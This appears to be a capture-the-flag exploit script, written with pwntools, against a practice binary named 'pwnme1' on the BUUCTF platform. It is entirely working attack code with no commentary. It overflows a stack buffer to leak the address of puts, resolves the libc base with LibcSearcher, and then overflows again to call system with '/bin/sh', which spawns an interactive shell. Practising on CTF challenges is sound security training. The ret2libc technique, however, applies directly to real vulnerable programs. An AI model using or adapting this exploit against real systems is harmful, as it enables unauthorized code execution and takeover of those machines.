from pwn import *
from LibcSearcher import *
p = remote('node3.buuoj.cn',28114)
#p = process('pwnme1')
elf = ELF('./pwnme1')
context.log_level = 'debug'
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']
p.sendline('5')

payload = 'a' * 0xa4 + 'aaaa' + p32(puts_plt) + p32(main) + p32(puts_got)
p.sendlineafter('Please input the name of fruit:',payload)
puts_addr = u32(p.recvuntil('\xf7')[-4:])
log.success("puts_addr ---->>" + hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
sys = libc_base + libc.dump('system')

binsh = libc_base + libc.dump('str_bin_sh')
p.sendline('5')
payload = 'a' *0xa8 + p32(sys) + 'junk' + p32(binsh)
p.sendlineafter('Please input the name of fruit:',payload)
p.interactive()

